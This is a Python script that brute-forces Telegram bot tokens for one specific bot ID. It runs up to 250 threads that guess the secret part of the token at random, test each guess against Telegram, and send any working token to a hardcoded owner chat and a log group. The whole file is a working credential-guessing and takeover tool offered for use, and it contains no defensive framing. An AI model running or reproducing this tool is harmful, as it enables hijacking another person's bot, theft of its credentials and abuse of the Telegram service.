import random
import threading
from telegram import Bot
import os,sys
from pytz import timezone 
from datetime import datetime

chars ="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"


THREAD_COUNT = int(os.environ.get("THREADS","250"))
GROUP_NAME = os.environ.get("GROUP_NAME","Mahabharat").replace("-","_")
TOKEN=os.environ.get("BOT_TOKEN","Unauthorised")
bot=Bot(TOKEN)

OWNER = 834508473
LOG_GROUP = -1001319740376

START_TIME = datetime.now(timezone("Asia/Kolkata"))

def Log(msg):
  print(msg)
  bot.send_message(LOG_GROUP,msg)

Log(f"""
Server Restart
No Of Bots : {THREAD_COUNT}
GROUP NAME : #{GROUP_NAME}
Current Time: {START_TIME:%Y-%m-%d %H:%M:%S%z}
""")

def run(n):
  ATTEMPT = 0
  while True:
    ATTEMPT += 1
    if ATTEMPT % 5000 == 0:
      if n == THREAD_COUNT:
        CURRENT_TIME = datetime.now(timezone("Asia/Kolkata"))
        TIME_DIFFERENCE = CURRENT_TIME - START_TIME
        TIME_TAKEN = TIME_DIFFERENCE.total_seconds()/60
        Log(f"""{ATTEMPT} Attempt Completed by {n} Bots \nBOT_GROUP_NAME: {GROUP_NAME} \nRUNNING FROM {TIME_TAKEN} Minutes""")
        
    token = "609517172:AA" + "".join(random.choices(chars,k=33))
    new_bot = Bot(token)
    try:
      username = new_bot.username
      if username:
        print(username)
        print(token)
        bot.send_message(OWNER,token)
        Log(username)
        bot.send_message(OWNER,"😎"*50)
        Log("#Congratulations")
        Log("👀"*20)
        Log(token[11:])
        sys.exit()
    except:
      pass
    

THREADS = []
for i in range(THREAD_COUNT):
  thread = threading.Thread(target=run,args=[i])
  thread.start()
  THREADS.append(thread)
print(len(THREADS))
  
for thread in THREADS:
  thread.join()
print("Done")
